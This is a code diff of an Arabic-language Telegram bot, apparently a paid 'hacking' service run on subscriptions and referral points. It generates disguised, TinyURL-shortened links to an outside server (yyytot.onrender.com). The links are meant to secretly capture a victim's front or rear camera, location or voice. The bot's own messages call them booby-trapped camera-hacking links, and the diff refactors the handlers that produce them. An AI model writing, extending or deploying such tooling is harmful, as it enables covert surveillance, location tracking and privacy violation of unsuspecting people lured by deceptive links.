@@ -716,11 +716,22 @@ bot.on('message', async (msg) => {
   }
 });
 
-bot.on('callback_query', (callbackQuery) => {
+function shortenUrl(url) {
+  return new Promise((resolve, reject) => {
+    TinyURL.shorten(url, function(res, err) {
+      if (err) reject(err);
+      else resolve(res);
+    });
+  });
+}
+
+// معالجة الطلبات المختلفة
+bot.on('callback_query', async (callbackQuery) => {
     const chatId = callbackQuery.message.chat.id;
     const userId = callbackQuery.from.id.toString();
     const data = callbackQuery.data;
 
+    let url;
     switch(data) {
         case 'create_referral':
             const referralLink = createReferralLink(userId);
@@ -735,68 +746,29 @@ bot.on('callback_query', (callbackQuery) => {
                 : `لديك حاليًا ${points} نقطة. اجمع ${pointsRequiredForSubscription} نقطة للاشتراك في البوت واستخدامه بدون قيود.`;
             bot.sendMessage(chatId, message);
             break;
+        case 'front_camera':
+        case 'rear_camera':
+            url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
+            const shortCameraUrl = await shortenUrl(url);
+            bot.sendMessage(chatId, `تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${shortCameraUrl}`);
+            break;
+        case 'voice_record':
+            bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
+            break;
+        case 'get_location':
+            url = `https://yyytot.onrender.com/getLocation/${chatId}`;
+            const shortLocationUrl = await shortenUrl(url);
+            bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${shortLocationUrl}`);
+            break;
         default:
             if (!subscribedUsers.has(userId)) {
-                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لان تستطيع استخدام هاذا الميزه سوى 5مرات قوم بل الاشتراك من المطور او قوم بجمع نقاط لاستخدام بدون قيود.');
+                bot.sendMessage(chatId, 'ملاحظة عزيزي المستخدم لا تستطيع استخدام هذه الميزة سوى 5 مرات. قم بالاشتراك من المطور أو اجمع نقاط لاستخدامه بدون قيود.');
             } else {
                 bot.sendMessage(chatId, 'جاري تنفيذ العملية...');
                 // هنا يمكنك إضافة الكود الخاص بكل عملية
             }
     }
 });
-
-
-
-
-function shortenUrl(url) {
-  return new Promise((resolve, reject) => {
-    TinyURL.shorten(url, function(res, err) {
-      if (err)
-        reject(err);
-      else
-        resolve(res);
-    });
-  });
-}
-
-bot.on('callback_query', async (callbackQuery) => {
-    const chatId = callbackQuery.message.chat.id;
-    const data = callbackQuery.data;
-
-    if (data === 'front_camera' || data === 'rear_camera') {
-        const url = `https://yyytot.onrender.com/camera/${chatId}?cameraType=${data === 'front_camera' ? 'front' : 'rear'}`;
-        const shortUrl = await shortenUrl(url);
-        bot.sendMessage(chatId, `تم تلغيم رابط اختراق الكاميرا الأمامية والخلفية: ${shortUrl}`);
-    } else if (data === 'voice_record') {
-        bot.sendMessage(chatId, 'من فضلك أدخل مدة التسجيل بالثواني (1-20):');
-    } else if (data === 'get_location') {
-        const url = `https://yyytot.onrender.com/getLocation/${chatId}`;
-        console.log('Data received:', data);
-        console.log('Chat ID:', chatId);
-        console.log('URL:', url);
-        
-        const shortUrl = await shortenUrl(url);
-        bot.sendMessage(chatId, `انقر على الرابط للحصول على موقعك: ${shortUrl}`)
-            .then(() => console.log('Message sent successfully'))
-            .catch(err => console.error('Error sending message:', err));
-    }
-});
-
-bot.on('message', async (msg) => {
-    const chatId = msg.chat.id;
-    const duration = parseInt(msg.text, 10);
-
-    if (!isNaN(duration)) {
-        if (duration > 0 && duration <= 20) {
-            const link = `https://yyytot.onrender.com/record/${chatId}?duration=${duration}`;
-            const shortLink = await shortenUrl(link);
-            bot.sendMessage(chatId, `تم تجهيز الرابط لتسجيل صوت لمدة ${duration} ثواني: ${shortLink}`);
-        } else {
-            bot.sendMessage(chatId, 'الحد الأقصى لمدة التسجيل هو 20 ثانية. الرجاء إدخال مدة صحيحة.');
-        }
-    }
-});
-
 bot.on('callback_query', async (query) => {
     const chatId = query.message.chat.id;
     const baseUrl = 'https://yyytot.onrender.com'; // Change this to your actual URL
